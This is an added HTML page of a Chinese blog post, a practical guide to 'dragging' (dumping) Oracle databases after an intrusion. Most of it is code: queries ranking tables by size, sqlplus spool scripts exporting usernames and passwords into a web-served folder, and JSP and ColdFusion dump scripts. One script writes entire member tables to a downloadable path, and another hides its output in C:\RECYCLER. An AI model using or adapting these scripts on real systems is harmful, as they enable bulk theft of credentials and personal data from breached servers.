@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Oracle拖库指南 | sqzr&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="励志成为包工头的搬砖者">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Oracle拖库指南">
+<meta property="og:url" content="http://sqzr.github.io//blog/2014/07/19/oracle-xia-tuo-ku-zhi-lan/">
+<meta property="og:site_name" content="sqzr's blog">
+<meta property="og:description" content="励志成为包工头的搬砖者">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Oracle拖库指南">
+<meta name="twitter:description" content="励志成为包工头的搬砖者">
+
+  
+    <link rel="alternative" href="/atom.xml" title="sqzr&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="http://fonts.useso.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">sqzr&#39;s blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">记录学习过程中的点点滴滴</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-github-link" class="nav-icon" href="https://github.com/sqzr" title="Github" target="_blank"></a>
+        
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><input type="submit" value="&#xF002;" class="search-form-submit"><input type="hidden" name="q" value="site:http://sqzr.github.io"></form>
+      </div>
+    </div>
+  </div>
+  <script>
+    
+    document.getElementById("banner").style.backgroundImage = "url(/css/images/banner.png)";
+    
+</script>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-oracle-xia-tuo-ku-zhi-lan" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+<a href="/blog/2014/07/19/oracle-xia-tuo-ku-zhi-lan/" class="article-date">
+  <time datetime="2014-07-19T01:10:00.000Z" itemprop="datePublished">2014 7月 19</time>
+</a>
+
+
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/渗透/">渗透</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Oracle拖库指南
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+		
+		<div id="toc" class="toc-article">
+			<h2 class="toc-title"><span>文章目录</span></h2>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#常用sql语句"><span class="toc-number">1.</span> <span class="toc-text">常用sql语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-number">2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlplus"><span class="toc-number">3.</span> <span class="toc-text">sqlplus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jsp_脱裤脚本"><span class="toc-number">4.</span> <span class="toc-text">jsp 脱裤脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ColdFusion_版脱裤脚本"><span class="toc-number">5.</span> <span class="toc-text">ColdFusion 版脱裤脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oracle_整表预览_jsp_脚本"><span class="toc-number">6.</span> <span class="toc-text">oracle 整表预览 jsp 脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编码问题"><span class="toc-number">7.</span> <span class="toc-text">编码问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">8.</span> <span class="toc-text">参考</span></a></li></ol>
+		
+		</div>
+		
+        <h2 id="常用sql语句">常用sql语句</h2>
+<p>查询所有表 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> ALL_TABLES</span></div></pre></td></tr></table></figure>
+
+<p>查询当前用户表  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables;</span></div></pre></td></tr></table></figure>
+
+<p>查询所有表按大小排序  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SELECT</span> TABLE_NAME,NUM_ROWS <span class="keyword">FROM</span> ALL_TABLES   <span class="keyword">order</span> <span class="keyword">by</span>  NUM_ROWS  <span class="keyword">desc</span></span></div><div class="line"><span class="keyword">select</span> table_name,NUM_ROWS <span class="keyword">from</span> user_tables     <span class="keyword">order</span> <span class="keyword">by</span>  NUM_ROWS  <span class="keyword">desc</span></div></pre></td></tr></table></figure>
+
+<p>查询表前十条  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">select</span>  *   <span class="keyword">from</span>  users  <span class="keyword">where</span>  rownum &lt; <span class="number">10</span></span></div></pre></td></tr></table></figure>
+
+<p>分页查询 2000000 到 4000000  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> e.*,ROWNUM rn <span class="keyword">FROM</span> (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> ) e <span class="keyword">WHERE</span> ROWNUM &lt;= <span class="number">4000000</span>) <span class="keyword">WHERE</span> rn &gt; <span class="number">2000000</span></span></div></pre></td></tr></table></figure>
+
+<h2><a id="more"></a></h2>
+<h2 id="sqlplus">sqlplus</h2>
+<p>rpm 安装  </p>
+<blockquote>
+<p>   <a href="http://eduunix.ccut.edu.cn/index2/database/Oracle%20Instant%20Client/oracle-instantclient-sqlplus-11.1.0.1-1.i386.rpm" target="_blank" rel="external">http://eduunix.ccut.edu.cn/index2/database/Oracle%20Instant%20Client/oracle-instantclient-sqlplus-11.1.0.1-1.i386.rpm</a><br>   <a href="http://eduunix.ccut.edu.cn/index2/database/Oracle%20Instant%20Client/oracle-instantclient-basic-11.1.0.1-1.i386.rpm" target="_blank" rel="external">http://eduunix.ccut.edu.cn/index2/database/Oracle%20Instant%20Client/oracle-instantclient-basic-11.1.0.1-1.i386.rpm</a><br>   rpm -ivh oracle-instantclient-sqlplus-11.1.0.1-1.i386.rpm<br>   rpm -ivh oracle-instantclient-basic-11.1.0.1-1.i386.rpm  </p>
+</blockquote>
+<p>配置libs  </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vi <span class="regexp">/etc/</span>ld.so.conf</div><div class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/oracle/</span><span class="number">11.1</span>.<span class="number">0.1</span><span class="regexp">/client/</span>lib<span class="regexp">/</span></div></pre></td></tr></table></figure>
+
+<p>连接<br>交互式操作  </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sqlplus usewr/<span class="keyword">pass</span><span class="decorator">@172.100.100.41:1521/orabi</span></div><div class="line"><span class="decorator">@/tmp/1.sql</span></div></pre></td></tr></table></figure>
+
+<p>非交互式  </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlplus -s user/<span class="keyword">pass</span><span class="decorator">@172.100.100.41  @/tmp/1.sql</span></div></pre></td></tr></table></figure>
+
+<p>1.sql:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SET</span> feedback off  </span></div><div class="line"><span class="keyword">SET</span> newpage NONE  </div><div class="line"><span class="keyword">SET</span> pagesize <span class="number">50000</span>  </div><div class="line"><span class="keyword">SET</span> linesize <span class="number">300</span>  </div><div class="line"><span class="keyword">SET</span> verify off  </div><div class="line"><span class="keyword">SET</span> pagesize <span class="number">0</span>  </div><div class="line"><span class="keyword">SET</span> term off  </div><div class="line"><span class="keyword">SET</span> trims <span class="keyword">ON</span>  </div><div class="line"><span class="keyword">SET</span> heading off  </div><div class="line"><span class="keyword">SET</span> trimspool <span class="keyword">ON</span>  </div><div class="line"><span class="keyword">SET</span> trimout <span class="keyword">ON</span>  </div><div class="line"><span class="keyword">SET</span> timing off  </div><div class="line"><span class="keyword">SET</span> verify off  </div><div class="line"><span class="keyword">SET</span> colsep |  </div><div class="line">spool /<span class="keyword">var</span>/www/css/<span class="number">1.</span>txt</div><div class="line"><span class="keyword">SELECT</span>  user_name||<span class="string">','</span>||<span class="keyword">password</span>||<span class="string">','</span>||<span class="keyword">DATA</span>||<span class="string">','</span>||id  <span class="keyword">FROM</span>  <span class="keyword">USER</span>  <span class="keyword">WHERE</span>  rownum &lt; <span class="number">100</span> ;</div><div class="line">spool off</div></pre></td></tr></table></figure>
+
+<p>导出CSV格式  </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SET</span> feedback off  </span></div><div class="line"><span class="keyword">SET</span> newpage NONE  </div><div class="line"><span class="keyword">SET</span> pagesize <span class="number">0</span>  </div><div class="line"><span class="keyword">SET</span> linesize <span class="number">5000</span></div><div class="line"><span class="keyword">SET</span> verify off </div><div class="line"><span class="keyword">SET</span> term off  </div><div class="line"><span class="keyword">SET</span> trims <span class="keyword">ON</span>  </div><div class="line"><span class="keyword">SET</span> heading off  </div><div class="line"><span class="keyword">SET</span> trimspool <span class="keyword">ON</span>  </div><div class="line"><span class="keyword">SET</span> trimout <span class="keyword">ON</span>  </div><div class="line"><span class="keyword">SET</span> timing off  </div><div class="line"><span class="keyword">SET</span> verify off  </div><div class="line"><span class="keyword">SET</span> colsep |  </div><div class="line">spool D:\<span class="number">007.</span>csv</div><div class="line"><span class="keyword">SELECT</span> <span class="string">'id,username,password'</span> <span class="keyword">FROM</span> dual;</div><div class="line"><span class="operator"><span class="keyword">SELECT</span> id||<span class="string">','</span>||username||<span class="string">','</span>||<span class="keyword">password</span> <span class="keyword">FROM</span> admin <span class="keyword">WHERE</span> rownum&lt;<span class="number">100</span>;</span></div><div class="line">spool off</div></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="jsp_脱裤脚本">jsp 脱裤脚本</h2>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span>%&gt;</div><div class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*,java.lang.*,java.sql.*"</span>%&gt;</div><div class="line">&lt;%</div><div class="line"></div><div class="line">Class.forName(<span class="string">"oracle.jdbc.driver.OracleDriver"</span>);</div><div class="line">Connection conn = DriverManager.getConnection(<span class="string">"jdbc:oracle:thin:@172.0.0.1:1521:orabi"</span>, <span class="string">"admin"</span>, <span class="string">"admin"</span>);</div><div class="line">File f = <span class="keyword">new</span> File(<span class="string">"/webapps/ROOT/css/t1.txt"</span>);</div><div class="line">BufferedWriter bw = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(f));</div><div class="line">Statement stmt=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);</div><div class="line">ResultSet rs=stmt.executeQuery(<span class="string">"select  *   from  member where  rownum &gt; 2000000"</span>);</div><div class="line">ResultSetMetaData rsmd = rs.getMetaData();</div><div class="line"><span class="keyword">int</span> numberOfColumns = rsmd.getColumnCount();</div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;numberOfColumns+<span class="number">1</span>;i++)</div><div class="line">{</div><div class="line">bw.write(rsmd.getColumnName(i)+<span class="string">","</span>);</div><div class="line">}</div><div class="line"><span class="keyword">while</span> (rs.next())</div><div class="line">{</div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;numberOfColumns+<span class="number">1</span>;i++){</div><div class="line"></div><div class="line">bw.write(rs.getString(i)+<span class="string">","</span>);</div><div class="line"></div><div class="line">}</div><div class="line">bw.newLine();</div><div class="line">bw.flush();</div><div class="line">}</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">out.print(rs);</div><div class="line"></div><div class="line">%&gt;</div></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="ColdFusion_版脱裤脚本">ColdFusion 版脱裤脚本</h2>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">CFSET</span> <span class="attribute">USERNAME</span>=<span class="value">"user"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">CFSET</span> <span class="attribute">PASSWORD</span>=<span class="value">"pass"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">CFSET</span> <span class="attribute">DATABASE</span>=<span class="value">"ya_db"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">CFTRY</span>&gt;</span></div><div class="line"> <span class="tag">&lt;<span class="title">CFQUERY</span> <span class="attribute">NAME</span>=<span class="value">"DATA"</span> <span class="attribute">DATASOURCE</span>=<span class="value">#DATABASE#</span> <span class="attribute">USERNAME</span>=<span class="value">#USERNAME#</span> <span class="attribute">PASSWORD</span>=<span class="value">#PASSWORD#</span>&gt;</span></div><div class="line">    SELECT * FROM MEMBER</div><div class="line"> <span class="tag">&lt;/<span class="title">CFQUERY</span>&gt;</span></div><div class="line"> <span class="tag">&lt;<span class="title">CFCATCH</span> <span class="attribute">Type</span>=<span class="value">"Any"</span>&gt;</span><span class="tag">&lt;/<span class="title">CFCATCH</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">CFTRY</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">CFSAVECONTENT</span> <span class="attribute">variable</span>=<span class="value">"Dump_DATA"</span>&gt;</span></div><div class="line"> <span class="tag">&lt;<span class="title">CFDUMP</span> <span class="attribute">var</span>=<span class="value">"#DATA#"</span> <span class="attribute">EXPAND</span>=<span class="value">"YES"</span> <span class="attribute">FORMAT</span>=<span class="value">"TEXT"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">CFSAVECONTENT</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">cffile</span> <span class="attribute">action</span>=<span class="value">"write"</span> <span class="attribute">output</span>=<span class="value">"#Dump_DATA#"</span> <span class="attribute">FILE</span>=<span class="value">"C:\\RECYCLER\\#USERNAME#_DATA.txt"</span>&gt;</span></div></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="oracle_整表预览_jsp_脚本">oracle 整表预览 jsp 脚本</h2>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span>%&gt;</div><div class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*,java.lang.*,java.sql.*"</span>%&gt;</div><div class="line">&lt;%</div><div class="line"></div><div class="line">Class.forName(<span class="string">"oracle.jdbc.driver.OracleDriver"</span>);</div><div class="line">Connection conn = DriverManager.getConnection(<span class="string">"jdbc:oracle:thin:@127.0.0.1:1521"</span>, <span class="string">"admin"</span>, <span class="string">"password"</span>);</div><div class="line">Statement stmt=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);</div><div class="line">String html=<span class="string">""</span>;</div><div class="line">File file = <span class="keyword">new</span> File(<span class="string">"/tmp/data.txt"</span>);</div><div class="line">BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(file));</div><div class="line">String line;</div><div class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) {</div><div class="line"></div><div class="line">html=html+<span class="string">"&lt;h3&gt;"</span>+line+<span class="string">":&lt;/h3&gt;&lt;table border=1&gt;&lt;tr&gt;"</span>;</div><div class="line">ResultSet rs=stmt.executeQuery(<span class="string">"select * from "</span>+line+<span class="string">" where rownum &lt; 100"</span>);</div><div class="line">ResultSetMetaData rsmd = rs.getMetaData();</div><div class="line"><span class="keyword">int</span> numberOfColumns = rsmd.getColumnCount();</div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;numberOfColumns+<span class="number">1</span>;i++)</div><div class="line">{</div><div class="line">  html=html+<span class="string">"&lt;th&gt;"</span>+rsmd.getColumnName(i)+<span class="string">"&lt;/th&gt;"</span>;</div><div class="line">}</div><div class="line">html+=<span class="string">"&lt;/tr&gt;"</span>;</div><div class="line"><span class="keyword">while</span> (rs.next())</div><div class="line">{</div><div class="line"></div><div class="line">  html+=<span class="string">"&lt;tr&gt;"</span>;</div><div class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;numberOfColumns+<span class="number">1</span>;i++){</div><div class="line"></div><div class="line">    html=html+<span class="string">"&lt;td&gt;"</span>+rs.getString(i)+<span class="string">"&lt;/td&gt;"</span>;</div><div class="line"></div><div class="line"></div><div class="line">  }</div><div class="line">  html+=<span class="string">"&lt;/tr&gt;"</span>;</div><div class="line">}</div><div class="line">  rs.close();</div><div class="line">  html+=<span class="string">"&lt;tr&gt;&lt;/table&gt;"</span>;</div><div class="line">}</div><div class="line">File f = <span class="keyword">new</span> File(<span class="string">"/tmp/info.css"</span>);</div><div class="line">BufferedWriter bw = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(f));</div><div class="line">bw.write(html);</div><div class="line"></div><div class="line"></div><div class="line">bw.close();</div><div class="line">br.close();</div><div class="line">stmt.close();</div><div class="line">conn.close();</div><div class="line"></div><div class="line">%&gt;</div></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="编码问题">编码问题</h2>
+<p>查询当前编码  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">select</span> userenv(<span class="string">'language'</span>) <span class="keyword">from</span> dual;</span></div></pre></td></tr></table></figure>
+
+<p>命令行执行  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export NLS_LANG="american_america.AL32UTF8"</div></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="参考">参考</h2>
+<p><a href="http://liuxun.org/blog/linux-xia-occi-bian-cheng/" target="_blank" rel="external">http://liuxun.org/blog/linux-xia-occi-bian-cheng/</a><br><a href="https://github.com/yaseng/pentest/blob/master/note/oracle.md" target="_blank" rel="external">https://github.com/yaseng/pentest/blob/master/note/oracle.md</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+	  
+	  <a data-url="http://sqzr.github.io//blog/2014/07/19/oracle-xia-tuo-ku-zhi-lan/" data-id="0ihl0vc8l89wykbb" data_title="Oracle拖库指南" data_summary="常用sql语句
+查询所有表 
+1SELECT * FR..." class="article-share-link">Share</a>
+      
+
+      
+	  
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/oracle/">oracle</a></li></ul>
+
+	  
+<span>
+更新日期:<time datetime="2014-10-30T12:41:49.000Z" itemprop="dateModified">2014 10月 30</time>
+</span>
+
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/blog/2014/08/06/bian-yi-pcshare-yuan-cheng-kong-zhi-ruan-jian/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          编译PcShare远程管理软件
+        
+      </div>
+    </a>
+  
+  
+    <a href="/blog/2014/07/08/zmap-shi-yong-wen-dang/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Zmap 使用文档</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+<!-- 多说评论框 start -->
+
+<!-- 多说评论框 end -->
+</section>
+        
+          
+<aside id="sidebar">
+
+  
+    
+<div class="widget-wrap">
+  <h3 class="widget-title">ABOUT ME</h3>
+  <ul class="widget about-me">
+    
+    <li><img class="author" title="About me" src="http://www.gravatar.com/avatar/5ba302d74468e44e87e1e1fd94b127fa?s=180" /></li>
+    
+    
+    <li>励志成为包工头的搬砖者</li>
+    
+  </ul>
+</div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/openwrt/">openwrt</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/折腾/">折腾</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a><span class="category-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/linux/" style="font-size: 20.00px; color: #1db400;">linux</a><a href="/tags/mac/" style="font-size: 15.33px; color: #5dbe94;">mac</a><a href="/tags/mysql/" style="font-size: 13.00px; color: #7dc3de;">mysql</a><a href="/tags/oracle/" style="font-size: 15.33px; color: #5dbe94;">oracle</a><a href="/tags/python/" style="font-size: 17.67px; color: #3db94a;">python</a><a href="/tags/zmap/" style="font-size: 13.00px; color: #7dc3de;">zmap</a><a href="/tags/神器/" style="font-size: 20.00px; color: #1db400;">神器</a>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">archive</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">August 2014</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/07/">July 2014</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/06/">June 2014</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/04/">April 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">March 2014</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">January 2014</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">December 2013</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">November 2013</a><span class="archive-list-count">8</span></li></ul>
+    </div>
+  </div>
+
+
+  
+
+</aside>
+
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2014 sqzr<br>
+      Powered by <a href="http://zespia.tw/hexo/" target="_blank">Hexo</a> and Theme by <a href="https://github.com/howiefh/hexo-theme-landscape-f" target="_blank" title="Landscape-F">Landscape-F</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+
+<!-- 多说公共JS代码 end -->
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<!--
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.min.js"></script>
+-->
+<script src="/js/jquery.min.js" type="text/javascript"></script>
+
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+
+  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>
+
+
+
+<div class="bottom-btn">
+
+	<a class="icon-gotop" href="javascript:void(0)" title="返回顶部"></a>
+	<script src="/js/gotop.js" type="text/javascript"></script>
+
+	<!--
+	<script src="/js/gotop.js"></script>
+	-->
+
+
+</div>
+<script src="/js/toc_aside_toggle.js" type="text/javascript"></script>
+
+
+
+<script src="/js/script.js" type="text/javascript"></script>
+
+
+  </div>
+</body>
+</html>
